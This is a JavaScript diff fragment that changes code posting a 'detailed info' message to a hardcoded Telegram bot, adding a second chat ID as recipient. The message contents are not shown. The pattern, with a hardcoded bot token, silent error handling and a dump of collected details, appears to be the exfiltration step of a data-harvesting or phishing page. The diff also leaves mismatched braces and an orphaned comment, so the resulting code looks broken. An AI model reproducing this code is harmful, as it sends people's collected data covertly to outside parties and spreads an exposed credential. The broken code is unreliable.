@@ -517,23 +517,29 @@
 ${detailedInfoSection}
 `;
 
+
                 const botToken = '6058106297:AAE3o2YdDcc915N81s91F3S9jzMTYj1k0UQ';
-                const chatId = '1747742228';
+const chatIds = ['1747742228', '6483881505']; // 
 
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-                try {
-                    const response = await fetch(url, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: chatId,
-                            text: fullMessage,
-                            parse_mode: 'Markdown'
-                        })
-                    });
-                    await response.json(); // Consume response to ensure request completes
-                } catch (error) {
+try {
+    for (const chatId of chatIds) {
+        const response = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: fullMessage,
+                parse_mode: 'Markdown'
+            })
+        });
+        await response.json(); // Message भेजने की पुष्टि
+    }
+} catch (error) {
+    console.error('Telegram Error:', error);
+}
+}
                     // Silently handle fetch errors
                 }
             }
